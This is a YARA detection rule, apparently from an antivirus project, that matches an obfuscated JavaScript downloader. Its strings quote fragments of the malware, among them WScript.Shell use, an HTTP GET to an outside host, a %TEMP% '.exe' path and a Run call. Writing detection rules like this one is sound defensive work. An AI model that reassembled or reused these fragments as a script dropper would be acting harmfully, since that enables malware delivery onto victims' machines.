rule sig_20160330_5486744e0442bcf3cb1e28d3591eccb9 {
  meta:
    description = "datamaliciousorder - file 20160330_5486744e0442bcf3cb1e28d3591eccb9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "977da9ff4381ff242e10ba7b7af1e5dfe0cc0b44594f3616cc9391f62f8df341"

  strings:
    $s1  = "function _SC(_HX, _X0){_R = _R * 1; return _HX - _X0;};" fullword ascii
    $s2  = "var _L = function _Y() {return WScript[_HT](\"WScript\"+\".Shell\");}(), _AZ = 11;" fullword ascii
    $s3  = "_VU[_X](\"GET\", \"http://bqsc.pt/c6ska\", false);" fullword ascii
    $s4  = "if (_VU[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _P() {return _L[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"GuWKJ8Km.ex\" + \"e\";};" fullword ascii
    $s6  = "function _FE(){return _V + \"\";};" fullword ascii
    $s7  = "function _OM(_KV){_L[\"Run\"](_KV, _R, _R);};" fullword ascii
    $s8  = "function _SB() {return ((_AF == true) && (_AF == _O)) ? 1 : _R;};" fullword ascii
    $s9  = "function _M()" fullword ascii
    $s10 = "function _K0(){return _HT;};" fullword ascii
    $s11 = "function _K(){return 22;};" fullword ascii
    $s12 = "function _C(_HU) {var _TA = (1, 2, 3, 4, 5, _HU); return _TA;};" fullword ascii
    $s13 = "return _SC(_KP, _XU);" fullword ascii
    $s14 = " while (_OJ){" fullword ascii
    $s15 = "var _K1 = new this[\"Date\"]();" fullword ascii
    $s16 = "var _AF = false;" fullword ascii
    $s17 = "var _ON = false;" fullword ascii
    $s18 = "var _O = false;" fullword ascii
    $s19 = "_O = true; " fullword ascii
    $s20 = "_AF = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}